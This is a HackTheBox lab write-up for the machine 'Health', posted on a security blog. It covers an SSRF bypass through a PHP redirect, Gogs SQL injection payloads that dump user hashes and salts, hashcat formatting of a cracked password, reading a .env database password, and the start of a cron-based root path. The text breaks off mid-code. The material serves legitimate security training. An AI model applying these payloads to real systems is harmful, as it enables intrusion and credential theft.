<!doctype html><html lang=en dir=ltr><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>HTB - Health | Lux-Sit</title><meta name=generator content="Hugo Eureka 0.9.3"><link rel=stylesheet href=https://alpharivs.github.io/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css><script defer src=https://alpharivs.github.io/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js></script>
<link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=stylesheet href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css media=print onload='this.media="all",this.onload=null' crossorigin><script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/cpp.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/c.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/vbscript.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/powershell.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/http.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/x86asm.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/go.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/javascript.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/ruby.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/php.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/shell.min.js crossorigin></script>
<link rel=stylesheet href=https://alpharivs.github.io/css/highlightjs.min.2958991528e43eb6fc9b8c4f2b8e052f79c4010718e1d1e888a777620e9ee63021c2c57ec7417a3108019bb8c41943e6.css media=print onload='this.media="all",this.onload=null'><script defer type=text/javascript src=https://alpharivs.github.io/js/fontawesome.min.5326b5f9c61e2373bd99194e0e41377b1e5e42801f5fc0f2a11fe5ac898837b5e0e86b52e854fc435c595e22ec6a61b1.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ media=print onload='this.media="all",this.onload=null' crossorigin><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script defer src=https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js integrity=sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0 crossorigin></script>
<link rel=icon type=image/png sizes=32x32 href=https://alpharivs.github.io/images/icon_hu4bae09c78eba04c5e7d71d1040233379_73006_32x32_fill_q75_box_center.jpg><link rel=apple-touch-icon sizes=180x180 href=https://alpharivs.github.io/images/icon_hu4bae09c78eba04c5e7d71d1040233379_73006_180x180_fill_q75_box_center.jpg><meta name=description content="Write-up for the machine &#34;Health&#34;"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://alpharivs.github.io/htb_writeups/"},{"@type":"ListItem","position":2,"name":"HTB - Health","item":"https://alpharivs.github.io/htb_writeups/health/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://alpharivs.github.io/htb_writeups/health/"},"headline":"HTB - Health | Lux-Sit","image":"https://alpharivs.github.io/images/htb_writeups/Health.png","datePublished":"2023-01-08T00:00:00+00:00","dateModified":"2023-01-08T00:00:00+00:00","wordCount":2343,"author":{"@type":"Person","name":"Alpharivs"},"publisher":{"@type":"Person","name":"WANG Chucheng","logo":{"@type":"ImageObject","url":"https://alpharivs.github.io/images/icon.jpg"}},"description":"Write-up for the machine \u0022Health\u0022"}</script><meta property="og:title" content="HTB - Health | Lux-Sit"><meta property="og:type" content="article"><meta property="og:image" content="https://alpharivs.github.io/images/icon.jpg"><meta property="og:url" content="https://alpharivs.github.io/htb_writeups/health/"><meta property="og:description" content="Write-up for the machine &#34;Health&#34;"><meta property="og:locale" content="en"><meta property="og:site_name" content="Lux-Sit"><meta property="article:published_time" content="2023-01-08T00:00:00+00:00"><meta property="article:modified_time" content="2023-01-08T00:00:00+00:00"><meta property="article:section" content="htb_writeups"><meta property="article:tag" content="HTB"><meta property="article:tag" content="SSRF"><meta property="article:tag" content="php"><meta property="article:tag" content="ctf"><meta property="article:tag" content="write-up"><meta property="article:tag" content="gogs"><meta property="og:see_also" content="https://alpharivs.github.io/htb_writeups/htb_shared/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/anode/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/a_la_mode/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/challenge_teight/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/darn_mice/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/magic_8_ball/"><body class="flex min-h-screen flex-col"><header class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"><div class="mx-auto w-full max-w-screen-xl"><script>let storageColorScheme=localStorage.getItem("lightDarkMode");((storageColorScheme=="Auto"||storageColorScheme==null)&&window.matchMedia("(prefers-color-scheme: dark)").matches||storageColorScheme=="Dark")&&document.getElementsByTagName("html")[0].classList.add("dark")</script><nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0"><a href=/ class="me-6 text-primary-text text-xl font-bold">Lux-Sit</a>
<button id=navbar-btn class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
<i class="fas fa-bars"></i></button><div id=target class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20"><div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0"><a href=/malware/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">Malware Analysis</a>
<a href=/writeups/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">CTF Write-ups</a>
<a href=/htb_writeups/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 selected-menu-item me-4">HacktheBox Write-ups</a></div><div class=flex><div class="relative pt-4 md:pt-0"><div class="cursor-pointer hover:text-eureka" id=lightDarkMode><i class="fas fa-adjust"></i></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id=is-open></div><div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40" id=lightDarkOptions><span class="px-4 py-1 hover:text-eureka" name=Light>Light</span>
<span class="px-4 py-1 hover:text-eureka" name=Dark>Dark</span>
<span class="px-4 py-1 hover:text-eureka" name=Auto>Auto</span></div></div></div></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id=is-open-mobile></div></nav><script>let element=document.getElementById("lightDarkMode");storageColorScheme==null||storageColorScheme=="Auto"?document.addEventListener("DOMContentLoaded",()=>{window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",switchDarkMode)}):storageColorScheme=="Light"?(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","sun"),element.firstElementChild.classList.add("fa-sun")):storageColorScheme=="Dark"&&(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","moon"),element.firstElementChild.classList.add("fa-moon")),document.addEventListener("DOMContentLoaded",()=>{getcolorscheme(),switchBurger()})</script></div></header><main class="grow pt-16"><div class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8"><div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12"><div class="bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"><article class=prose><h1 class=mb-4>HTB - Health</h1><div class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"><div class="me-6 my-2"><i class="fas fa-calendar me-1"></i>
<span>2023-01-08</span></div><div class="me-6 my-2"><i class="fas fa-clock me-1"></i>
<span>11 min read</span></div><div class="me-6 my-2"><i class="fas fa-folder me-1"></i>
<a href=https://alpharivs.github.io/categories/writeups/ class=hover:text-eureka>writeups</a></div></div><img src=https://alpharivs.github.io/images/htb_writeups/Health.png class=w-full alt="Featured Image"><h2 id=enumeration>Enumeration</h2><h3 id=host-discovery>Host Discovery</h3><p>First of all we will perform some basic recon.</p><pre><code class=language-bash># Adding the target IP as an alias for convenience.
❯ target='10.10.11.176'
❯ echo $target

❯ ping -c3 $target
PING 10.10.11.176 (10.10.11.176) 56(84) bytes of data.
64 bytes from 10.10.11.176: icmp_seq=1 ttl=63 time=313 ms
64 bytes from 10.10.11.176: icmp_seq=2 ttl=63 time=35.5 ms
64 bytes from 10.10.11.176: icmp_seq=3 ttl=63 time=34.3 ms
</code></pre><p>TTL value of ~64 is a solid indicator that this is a Linux system.</p><h3 id=port-scanning>Port Scanning</h3><p>Let&rsquo;s perform a quick Nmap Scan.</p><pre><code class=language-ruby>❯ sudo nmap $target -Pn -n -T4 -oG recon/nmap.out
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 19:10 CET
Nmap scan report for 10.10.11.176
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
</code></pre><p>Now that we know which ports are open (or not sending a reset) we can proceed to run a detailed Nmap scan.</p><pre><code class=language-ruby>❯ sudo nmap $target -sC -sV -n -Pn -T4 -oN recon/nmap.out
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 19:11 CET
Nmap scan report for 10.10.11.176
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32b7f4d42f45d330ee123b0367bbe631 (RSA)
|   256 86e15d8c2939acd7e815e649e235ed0c (ECDSA)
|_  256 ef6bad64d5e45b3e667949f4ec4c239f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
</code></pre><p>Nmap confirms that we are dealing with a Linux box (shown as a Ubuntu box), we can also see that port 3000 is reported as filtered that means that nmap is not receiving a rst, this could mean that there are iptables rules present or a firewall as the packets seem to be just dropped.</p><h2 id=website-tcp-80>Website TCP 80</h2><h3 id=exploring-the-website>Exploring the Website</h3><p>Opening the site we can see the following:</p><p><img src=images/main.png alt=main></p><p>We immediately see 2 things, a host name <strong>health.htb</strong> which we will proceed to add to our hosts file and a webapp which seems to perform a health check on a website that the user wants to monitor and can send a webhook notifying the state of the monitored website.</p><p>Before testing this WebApp we will perform some basic recon.</p><h3 id=recon>Recon</h3><p>Let&rsquo;s start by doing a quick enumeration of the tech stack.</p><pre><code class=language-shell>❯ whatweb http://health.htb/
http://health.htb/ [200 OK] Apache[2.4.29], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], Email[contact@health.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.176], Laravel, Script[text/js], Title[HTTP Monitoring Tool], X-UA-Compatible[ie=edge]
</code></pre><p>And running a basic vulnerability scan.</p><pre><code class=language-bash>❯ nuclei -u http://health.htb/ -ni -o recon/nuclei.out

[apache-detect] [http] [info] http://health.htb/ [Apache/2.4.29 (Ubuntu)]
[fingerprinthub-web-fingerprints:laravel] [http] [info] http://health.htb/
[fingerprinthub-web-fingerprints:laravel-framework] [http] [info] http://health.htb/
[tech-detect:laravel] [http] [info] http://health.htb/
[waf-detect:ats] [http] [info] http://health.htb/
[waf-detect:apachegeneric] [http] [info] http://health.htb/
[robots-txt-endpoint] [http] [info] http://health.htb/robots.txt
[options-method] [http] [info] http://health.htb/ [GET,HEAD]
[openssh-detect] [network] [info] health.htb:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7]
</code></pre><p>Running a directory brute-force doesn&rsquo;t return anything meaningful so we are skipping the results of <strong>feroxbuster</strong>.</p><p>Now that we have a profile of the website we will test it&rsquo;s functionality.</p><h3 id=testing-the-webapp>Testing the WebApp</h3><p>We will first test how the application works by listening with ncat in ports 80 which will act as the website that we want to monitor and 9001 which will receive the webhook informing of the state of the website.</p><p><img src=images/hook.png alt=hook></p><p>After clicking <strong>test</strong> we can immediately see the following.</p><p>Ncat on port 80 has a hit.</p><pre><code class=language-bash>❯ sudo ncat -lnvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:43960.
GET / HTTP/1.0
Host: 10.10.14.34
Connection: close

^C
</code></pre><p>And after we manually closed the connection we can see that ncat in port 9001 has received the webhook hit.</p><pre><code class=language-bash>❯ ncat -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:58022.
POST / HTTP/1.1
Host: 10.10.14.34:9001
Accept: */*
Content-type: application/json
Content-Length: 100

{&quot;webhookUrl&quot;:&quot;http:\/\/10.10.14.34:9001\/&quot;,&quot;monitoredUrl&quot;:&quot;http:\/\/10.10.14.34\/&quot;,&quot;health&quot;:&quot;down&quot;}
</code></pre><p>Now that we know that it works let&rsquo;s try to emulate a working website to see how it is supposed to actually work.</p><p>First we create a basic html index file to serve.</p><pre><code class=language-html>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Health Check&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;p&gt;The Page is totally healthy and legit.&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>Next we listen on port 9001 to receive the webhook.</p><pre><code class=language-bash>❯ ncat -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:53092.
POST / HTTP/1.1
Host: 10.10.14.34:9001
Accept: */*
Content-type: application/json
Content-Length: 477

{&quot;webhookUrl&quot;:&quot;http:\/\/10.10.14.34:9001\/&quot;,&quot;monitoredUrl&quot;:&quot;http:\/\/10.10.14.34\/&quot;,&quot;health&quot;:&quot;up&quot;,&quot;body&quot;:&quot;&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Health Check&lt;\/title&gt;\n  &lt;\/head&gt;\n  &lt;body&gt;\n    &lt;p&gt;The Page is totally healthy and legit.&lt;\/p&gt;\n  &lt;\/body&gt;\n&lt;\/html&gt;\n&quot;,&quot;message&quot;:&quot;HTTP\/1.0 200 OK&quot;,&quot;headers&quot;:{&quot;Server&quot;:&quot;SimpleHTTP\/0.6 Python\/3.10.9&quot;,&quot;Date&quot;:&quot;Sun, 08 Jan 2023 18:29:41 GMT&quot;,&quot;Content-type&quot;:&quot;text\/html&quot;,&quot;Content-Length&quot;:&quot;135&quot;,&quot;Last-Modified&quot;:&quot;Sun, 08 Jan 2023 18:29:18 GMT&quot;}}
</code></pre><p>We see that we can extract the contents of the website that we are monitoring through the webhook, that opens the possibility of SSRF to get the contents of the filtered website!</p><h3 id=ssrf>SSRF</h3><p>There is some filtering present then trying to make the webapp monitor itself, no SSRF bypass that I&rsquo;ve tested seemed to work (ex: <strong>localhost</strong>, <strong>0177.00.00.01</strong>, <strong>017700000001</strong>, <strong>0x7f000001</strong> etc&mldr;)</p><h4 id=filter-bypass>Filter Bypass</h4><p>As we can&rsquo;t directly reach port 3000 due to the filtering the only option left is trying to redirect the webapp to itself.
<img src=images/plan.png alt=plan></p><p>A quick and easy way to achieve this is by using php and adding a Location header that redirects to our desired target.</p><p>So we should create a index.php file to serve.</p><pre><code class=language-php>&lt;?php
header('Location: http://10.10.11.176:3000/');
die();
?&gt;
</code></pre><p>And then we just need to start a local php server and click test in the website.</p><pre><code class=language-bash>❯ sudo php -S 10.10.14.34:80
[Sun Jan  8 19:59:24 2023] PHP 8.1.13 Development Server (http://10.10.14.34:80) started
[Sun Jan  8 19:59:32 2023] 10.10.11.176:46354 Accepted
[Sun Jan  8 19:59:32 2023] 10.10.11.176:46354 [302]: GET /
[Sun Jan  8 19:59:32 2023] 10.10.11.176:46354 Closing
</code></pre><p>To clearly see the extracted website we can save what we received in port 9001 to a file and proceed to do some jq magic!</p><pre><code class=language-bash>❯ cat 3000.txt| jq -r .body &gt; filtered.html
</code></pre><p>And voila we can see what&rsquo;s behind port 3000.
<img src=images/gogs.png alt=gogs></p><h2 id=gogs>Gogs</h2><p>Now that we know that we are dealing with gogs and which version it is we can search for known exploits which they surely exist as it&rsquo;s a really old version.</p><p>We can quickly find this <a href=https://www.exploit-db.com/exploits/35238>exploit</a>, the only problem is that we need to trigger it through a SSRF and it&rsquo;s a SQLI so the only viable way is to download the <a href=https://github.com/gogs/gogs/releases/tag/v0.5.5>same version of gogs</a> locally in order to figure out a payload that we could easily send through our SSRF vulnerability.</p><h3 id=database-enumeration>Database Enumeration</h3><p>Now that we have a local instance of Gogs running we can try out the exploit that we found. The exploit is a SQL injection so it makes sense to get a layout of the DB before attempting to test it.</p><pre><code class=language-bash>sqlite3 gogs.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter &quot;.help&quot; for usage hints.
sqlite&gt; .schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `passwd` TEXT NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER NOT NULL DEFAULT 0, `login_name` TEXT NULL, `type` INTEGER NULL, `num_followers` INTEGER NULL, `num_followings` INTEGER NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `location` TEXT NULL, `website` TEXT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `rands` TEXT NULL, `salt` TEXT NULL, `created` NUMERIC NULL, `updated` NUMERIC NULL, `description` TEXT NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL);
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);
CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
sqlite&gt; 
</code></pre><p>There are 3 key thing to take from the enumeration of the local DB:</p><ul><li>We are dealing with SQLite</li><li>There are 27 columns in the &ldquo;user&rdquo; table (as we can only do data exfiltration it makes sense to enumerate users)</li><li>The name of the user is in the third field</li></ul><p>With all that we can modify the PoC of the exploit that we previously found and transform it into a payload that could enumerate local users.</p><pre><code class=language-SQl>/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-
</code></pre><p>It works</p><pre><code class=language-json>{
  &quot;data&quot;: [
    {
      &quot;username&quot;: &quot;omegon&quot;,
      &quot;avatar&quot;: &quot;//1.gravatar.com/avatar/3e899d265c6a53baa769872fcfe2026d&quot;
    },
    {
      &quot;username&quot;: &quot;omegon&quot;,
      &quot;avatar&quot;: &quot;//1.gravatar.com/avatar/15&quot;
    }
  ],
  &quot;ok&quot;: true
}
</code></pre><p>So let&rsquo;s craft a payload that could extract all the data of the user ant let&rsquo;s test it remotely exploiting the SSRF that we found earlier.</p><pre><code class=language-sql>/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name||':'||email||':'||passwd||':'||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-
</code></pre><p>It worked as intended.</p><pre><code class=language-json>❯ cat exfil.txt| jq -r .body | jq .
{
  &quot;data&quot;: [
    {
      &quot;username&quot;: &quot;susanne&quot;,
      &quot;avatar&quot;: &quot;//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce&quot;
    },
    {
      &quot;username&quot;: &quot;susanne:admin@gogs.local:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37:sO3XIbeW14&quot;,
      &quot;avatar&quot;: &quot;//1.gravatar.com/avatar/15&quot;
    }
  ],
  &quot;ok&quot;: true
}
</code></pre><h2 id=crack-the-hash>Crack the Hash</h2><p>After some investigation we can see that gogs hashes passwords using &ldquo;<em>PBKDF2-HMAC-SHA256</em>&rdquo;. According to hashcat example hashes the format should be:</p><pre><code class=language-text>sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
</code></pre><p>our data is in hex so we need to transform it into base64 and we also need to know how many rounds are used so we do what every professional should do &mldr; ask chatGPT nicely &mldr; and we get the answer &ldquo;<em>10 000 rounds</em>&rdquo;</p><p>Now we transform our hash to base64 and crack it</p><pre><code class=language-bash># Hash
❯ echo &quot;66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37&quot; | xxd -r -p | base64 -w0
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
# Salt
❯ echo -n &quot;sO3XIbeW14&quot; | base64
c08zWEliZVcxNA==
# Hashcat formatted
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
</code></pre><p>We can successfully crack it.</p><pre><code class=language-bash>sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
</code></pre><h2 id=user-susanne>User Susanne</h2><p>We know that SSH is listening on the machine so let&rsquo;s first try our new credentials there.</p><pre><code class=language-bash>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

...(SNIP)...

susanne@health:~$ whoami
susanne
</code></pre><p>After not finding anything during our standard enumeration let&rsquo;s examine the contents of the web directory to see if we can find something interesting.</p><p>At first glance we can already see that there is a <em>.env</em> file which contains environment variables and inside there are credentials for <em>mySQL</em>.</p><pre><code class=language-bash>susanne@health:/var/www/html$ cat .env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
</code></pre><p>We can use those credentials to examine the <em>laravel</em> DB.</p><pre><code class=language-bash>susanne@health:/$ mysql -u laravel -p'MYsql_strongestpass@2014+' laravel
mysql&gt; show tables;
+------------------------+
| Tables_in_laravel      |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| tasks                  |
| users                  |
+------------------------+
</code></pre><p>For now we will just take note of the table names.</p><h3 id=cronjob>CronJob</h3><p>No having found anything more interesting we should try to enumerate for scheduled tasks running in the background using <em>pspy64</em></p><pre><code class=language-bash>2023/02/04 16:51:01 CMD: UID=0    PID=7651   | php artisan schedule:run 
2023/02/04 16:51:01 CMD: UID=0    PID=7650   | /bin/bash -c sleep 5 &amp;&amp; /root/meta/clean.sh 
2023/02/04 16:51:01 CMD: UID=0    PID=7654   | grep columns 
2023/02/04 16:51:01 CMD: UID=0    PID=7652   | sh -c stty -a | grep columns 
</code></pre><p>Artisan is being run by root, artisan is used to interact with Laravel so we can use artisan ourselves to enumerate the routes of the webapp.</p><h3 id=enumerating-the-webapp>Enumerating the WebApp</h3><pre><code class=language-bash>susanne@health:/var/www/html$ php artisan route:list
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+
| Domain | Method   | URI                 | Name    | Action                                                     | Middleware                               |
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+
|        | GET|HEAD | /                   |         | Closure                                                    | web                                      |
|        | GET|HEAD | api/user            |         | Closure                                                    | api                                      |
|        |          |                     |         |                                                            | App\Http\Middleware\Authenticate:sanctum |
|        | GET|HEAD | sanctum/csrf-cookie |         | Laravel\Sanctum\Http\Controllers\CsrfCookieController@show | web                                      |
|        | POST     | webhook             | webhook | App\Http\Controllers\TaskController@create                 | web                                      |
|        | GET|HEAD | webhook/{id}        |         | Closure                                                    | web                                      |
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+
</code></pre><p>The interesting one is webhook which is located in <em>App\Http\Controllers\TaskController</em>.</p><p>After some digging in we can see that the behavior for the <em>create</em> option is different than the <em>test</em> function that we used to test the webhook so let&rsquo;s investigate further.</p><p>Here we can see the option in the webapp.
<img src=images/task.png alt=task></p><p>And here we can see how the backend handles it.</p><pre><code class=language-php>$show = Task::create($validatedData);
return redirect('/webhook/' . $show-&gt;id)-&gt;with('message', 'Webhook is successfully created');
</code></pre><p>Following the import of the Task function we end up in the following code.</p><pre><code class=language-php>class Task extends Model
{

    use Uuids;
    use HasFactory;

    protected $fillable = ['webhookUrl', 'monitoredUrl', 'frequency', 'onlyError'];

    public $incrementing = false;

    protected $keyType = 'string';

}
</code></pre><p>The $fillable model looks like the contents of a DB table, so let&rsquo;s check the laravel DB.</p><h3 id=tasks-table>Tasks Table</h3><p>First let&rsquo;s create a new task and let&rsquo;s see if by any chance the task is stored in the laravel DB.</p><pre><code class=language-bash>mysql&gt; select * from tasks;
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
| b6b55b4b-1610-42e1-8a3d-2a5ed765ae2d | http://10.10.14.34:9001/ |         0 | http://10.10.14.34/ | */5 * * * * | 2023-02-04 17:09:32 | 2023-02-04 17:09:32 |
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
</code></pre><p>We confirm that the task is stored in the DB.</p><h2 id=root>Root</h2><p>Knowing that the task that we create is stored in the DB and that theres a cronjob executing in the background as root that runs the created tasks in order to find a potential way of exploiting that we need to see how the tasks are processed in order to know what field we can poison.</p><pre><code class=language-php>class HealthChecker
  {
    public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {
      $json = [];
      $json['webhookUrl'] = $webhookUrl;
      $json['monitoredUrl'] = $monitoredUrl;
      $res = @file_get_contents($monitoredUrl, false);
      if ($res) {
        if ($onlyError) {
          return $json;
        }
...(SNIP)...
